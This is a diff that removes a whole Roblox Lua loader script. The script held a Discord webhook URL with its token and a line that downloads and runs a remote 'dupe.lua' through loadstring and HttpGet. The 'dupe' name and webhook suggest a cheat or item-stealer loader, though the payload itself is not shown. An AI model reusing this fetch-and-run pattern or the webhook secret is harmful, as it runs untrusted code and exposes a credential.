@@ -1,16 +1,1 @@
-local Webhook = "https://discordapp.com/api/webhooks/1444338740201001003/NjrGjmT3FYUpDGDimhtXRbN1PiJwEVN69n5MTEfIvJl29f4s65LOZqhgKaU1Ua1B-Ypa"
 
-getgenv().UserPingThreshold = 50000000
-
-
--- =================================================================================
---      SCRIPT LOADER - DO NOT EDIT BELOW THIS LINE
--- =================================================================================
-
-if Webhook and Webhook:match("discord.com/api/webhooks") then
-    getgenv().UserWebhookURL = Webhook
-else
-    return
-end
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/LXZRz/dupe/main/dupe.lua', true))()
